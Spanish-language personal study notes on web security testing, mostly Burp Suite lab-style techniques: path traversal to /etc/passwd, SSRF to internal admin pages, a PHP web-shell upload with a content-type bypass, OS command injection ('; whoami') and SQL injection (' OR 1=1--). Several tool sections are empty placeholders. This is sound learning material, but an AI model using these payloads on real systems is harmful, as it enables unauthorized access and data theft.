# Seguridad Informática
- [Burp Suite](#burp-suite)
- [John the Ripper](#john-the-ripper)
- [Metasploit](#metasploit)
- [Nmap](#nmap)
- [Wireshark](#wireshark)
- [Sqlmap](#sqlmap)

Este documento recopila información y notas personales sobre diversas herramientas y técnicas en el campo de la seguridad informática.

## Burp Suite

Burp Suite es una herramienta esencial para el análisis de seguridad de aplicaciones web. Permite realizar pruebas manuales y automatizadas para identificar vulnerabilidades de seguridad.

### Path Traversal
Permite al atacante aceder a archivos que no deberia. Por ejemplo `https://insecure-website.com/loadImage?filename=../../../etc/passwd` permitiria acceder a `/var/www/images/../../../etc/passwd` que daria lugar a que se accediese en realidad a `/etc/passwd`.

### Autenticacions y autorizacion
- Autenticacion es que sea quien dice ser, autorizacion que tenga permisos de hacer algo.

### Trucos
- Es posible eludir el 2FA cuando la verificación se realiza en una página distinta.
- En robots txt se puede encontrar informacion sobre partes prohibidas.
- Se pueden modificar las cookies en los responses request, o en el inspector->aplications.
- AL intentar adivinar usuario, si acertamos: el mensaje de error o codigo puede ser distinto. si la contrasenia es mas larga puede demorar mas en caso de que el usuario exista.

### SSRF
- La falsificación de solicitud del lado del servidor (Server-side request forgery o SSRF) es una vulnerabilidad de seguridad web que permite a un atacante hacer que una aplicación del lado del servidor realice solicitudes a una ubicación no deseada, pudiendo conectar con servicios internos o externos y filtrar datos sensibles, como credenciales de autorización.
- Ejemplo: `POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1`
Cambiamos la ultima linea por `stockApi=http://localhost/admin`
Tambien pueden ser de la forma `stockApi=http://192.168.0.X/admin` en cuyo caso hay que explorar en X. El 0 puede ser 1.

### File vulnerabilities
- Se puede subir archivo php: `<?php echo file_get_contents('/path/to/target/file'); ?>` o `<?php echo system($_GET['command']); ?>` que luego puede ser `GET /example/exploit.php?command=id HTTP/1.1`
- Se puedden subir cambiando el content type en el request por `image/jpeg` o `image/png` (mandandolo a repetidor)

### OS commandd injection
#### Comandos utiles
| Propósito del comando        | Linux    | Windows         |
|------------------------------|----------|-----------------|
| Nombre del usuario actual    | `whoami` | `whoami`        |
| Sistema operativo            | `uname -a` | `ver`          |
| Configuración de red         | `ifconfig` | `ipconfig /all` |
| Conexiones de red            | `netstat -an` | `netstat -an` |
| Procesos en ejecución        | `ps -ef` | `tasklist`      |

##### Uso de la línea de comandos para testing
- Ejemplo de comando: `stockreport.pl 381 29` en línea de comandos para acceder al stock.
  - Payload de ejemplo: `productId=1&storeId=1; whoami`. Si se ejecuta desde terminal, este payload puede ser procesado sin mayores restricciones. ; o & o &&

### Detección de vulnerabilidades de inyección SQL

- Para detectar vulnerabilidades de inyección SQL manualmente, realiza un conjunto sistemático de pruebas contra cada punto de entrada en la aplicación.
- Sintaxis específica de SQL que evalúa al valor base (original) del punto de entrada, y a un valor diferente, y busca diferencias sistemáticas en las respuestas de la aplicación.
Condiciones booleanas tales como OR 1=1 y OR 1=2, y busca diferencias en las respuestas de la aplicación.
Cargas útiles diseñadas para provocar retrasos de tiempo cuando se ejecutan dentro de una consulta SQL, y busca diferencias en el tiempo que tarda en responder.
Cargas útiles OAST diseñadas para desencadenar una interacción de red fuera de banda cuando se ejecutan dentro de una consulta SQL, y monitorea cualquier interacción resultante.

#### Ejemplo de prueba de inyección SQL

GET /filter?category=Accessories' OR 1=1-- HTTP/2





## John the Ripper

(TBD - Información por agregar)

## Metasploit

(TBD - Información por agregar)

## Nmap

(TBD - Información por agregar)

## Wireshark

(TBD - Información por agregar)

## Sqlmap

(TBD - Información por agregar)

